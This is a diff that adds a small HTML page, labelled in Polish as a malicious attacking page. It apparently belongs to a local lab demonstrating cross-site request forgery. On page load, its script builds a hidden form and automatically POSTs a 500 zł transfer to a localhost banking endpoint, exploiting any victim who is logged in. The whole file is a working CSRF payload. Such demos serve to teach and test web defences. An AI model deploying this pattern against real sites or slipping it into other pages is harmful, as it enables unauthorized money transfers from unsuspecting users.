@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Złośliwa strona</title>
+</head>
+<body>
+  <h1>Strona atakująca</h1>
+  <p>Automatyczne wykonanie przelewu 500 zł na konto atakującego.</p>
+
+  <script>
+    const form = document.createElement('form');
+    form.method = 'POST';
+    form.action = 'http://localhost:3000/transfer';
+
+    const hiddenInput = document.createElement('input');
+    hiddenInput.type = 'hidden';
+    hiddenInput.name = 'amount';
+    hiddenInput.value = '500'; 
+
+    form.appendChild(hiddenInput);
+    document.body.appendChild(form);
+
+    form.submit();
+  </script>
+</body>
+</html>
